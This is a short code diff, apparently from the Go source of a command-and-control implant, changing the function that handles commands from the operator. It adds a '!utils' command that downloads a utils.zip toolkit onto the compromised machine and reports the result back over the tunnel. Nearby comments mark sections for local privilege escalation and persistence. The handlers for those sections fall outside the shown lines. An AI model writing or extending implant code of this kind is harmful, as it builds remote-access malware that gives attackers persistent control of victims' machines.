@@ -77,7 +77,7 @@ func processCCData(data *MsgTunData) {
 		}
 
 		/*
-			!command: special commands (not sent by user)
+		   !command: special commands (not sent by user)
 		*/
 
 		// LPE helper
@@ -127,6 +127,13 @@ func processCCData(data *MsgTunData) {
 			}
 
 			return
+		}
+
+		// download utils.zip
+		if cmdSlice[0] == "!utils" {
+			out = installUtils()
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+			goto send
 		}
 
 		// persistence
